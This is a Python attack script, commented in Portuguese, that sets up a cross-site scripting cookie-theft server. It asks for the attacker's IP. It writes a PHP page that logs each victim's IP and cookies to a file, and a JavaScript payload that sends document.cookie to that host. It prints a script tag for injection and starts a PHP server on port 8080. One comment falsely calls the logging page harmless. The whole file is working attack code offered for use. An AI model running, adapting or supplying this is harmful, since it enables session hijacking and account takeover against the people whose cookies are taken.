# O que o script vai fazer
# 1º - Pedir o IP do utilizador
# 2º - Criar o diretório /tmp/tmpserver
# 3º - Dentro desse diretório ele vai criar um ficheiro index.php com um determinado conteúdo
# 4º - Vai abrir um servidor web PHP na porta 8080
# 5º - Vai fornecer um payload usados com o IP do utilizador.

ip = input("Attacker IP: ")

from pathlib import Path
import subprocess

# Diretório do servidor
server_dir = Path("/tmp/tmpserver")
server_dir.mkdir(parents=True, exist_ok=True)

# Conteúdo do ficheiro PHP (exemplo inofensivo)
php_code = """<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
"""

js_code = f"""
        new Image().src='http://{ip}:8080/index.php?c='+document.cookie;
"""

# Criar index.php
index = server_dir / "index.php"
index.write_text(php_code, encoding="utf-8")

# Criar script.js
script = server_dir / "script.js"
script.write_text(js_code, encoding="utf-8")

print(f"[+] Criado: {index}")
print(f"[+] Payload: <script src='http://{ip}/script.js'></script>")

# Iniciar o servidor PHP
try:
    subprocess.run(
        ["php", "-S", "0.0.0.0:8080"],
        cwd=server_dir
    )
except FileNotFoundError:
    print("[!] O executável 'php' não foi encontrado no sistema.")

